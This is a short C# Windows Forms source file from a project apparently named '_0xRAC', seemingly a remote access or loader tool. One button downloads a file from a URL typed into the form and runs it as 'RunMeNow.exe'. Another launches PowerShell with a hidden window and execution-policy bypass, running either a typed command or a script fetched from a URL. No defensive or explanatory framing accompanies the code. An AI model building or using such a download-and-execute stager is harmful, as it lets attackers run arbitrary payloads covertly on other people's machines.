using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace _0xRAC
{
    public partial class Form1 : DevExpress.XtraEditors.XtraForm
    {

        WebClient client = new WebClient();

        public Form1()
        {
            InitializeComponent();
        }

        private void simpleButton1_Click(object sender, EventArgs e)
        {
            client.DownloadFile(textEdit1.Text, "RunMeNow.exe");
            Process.Start(Application.StartupPath + "\\RunMeNow.exe");
        }

        private void simpleButton2_Click(object sender, EventArgs e)
        {

            if (checkEdit1.Checked)
            {
                Process.Start("CMD.exe", "/C powershell -w h -ep bypass " + client.DownloadString(textEdit2.Text));
            }
            else
            {
                Process.Start("CMD.exe", "/C powershell -w h -ep bypass " + textEdit2.Text);
            }
        }

        private void checkEdit1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkEdit1.Checked)
            {
                textEdit2.Text = "Place url here";
            }
            else
            {
                textEdit2.Text = "Command to be ran";
            }
        }
    }
}
